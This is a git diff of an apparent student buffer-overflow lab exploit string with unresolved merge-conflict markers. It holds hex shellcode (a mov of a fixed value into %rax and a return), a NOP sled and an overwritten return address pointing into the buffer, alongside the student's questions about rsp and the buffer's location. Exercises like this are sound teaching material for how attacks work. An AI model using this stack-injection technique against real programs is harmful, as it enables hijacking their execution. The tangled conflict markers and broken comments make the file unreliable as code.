@@ -1,6 +1,10 @@
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 54                   	/* push   %rsp */ 
+=======
+/* 54                   	/* push   %rsp */ 
+>>>>>>> bd5da4846aafd6dbb021d4ad127a46a24c53bdaf
 55                   	/* push   %rbp */ 
 48 89 e5             	/* mov    %rsp,%rbp */ 
 48 83 ec 20          	/* sub    $0x20,%rsp */ 
@@ -17,10 +21,27 @@ c3                   	/* retq */
 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90
 90 90 90 90 90 
-50 2f 78 55 00 00 00 00 /* address of beginning of buffer */
+50 2f 78 55 00 00 00 00 */ /* address of beginning of buffer */
 
+<<<<<<< HEAD
  /* questions: */ 
  /* - correct how it do rsp and rbp? */  
  /* - how big is buffer? */
  /* - what is buffer starting address? */ 
 >>>>>>> fdac72d9c702a05a7dbbe96ae135a7ccfe093cfd
+=======
+
+48 c7 c0 ed 24 25 62 	/* mov    $0x622524ed,%rax */ 
+c3                   	/* retq */ 
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90
+90 90 90 90 90 90 90 90 /* address of rbp */
+50 2f 78 55 00 00 00 00
+>>>>>>> bd5da4846aafd6dbb021d4ad127a46a24c53bdaf
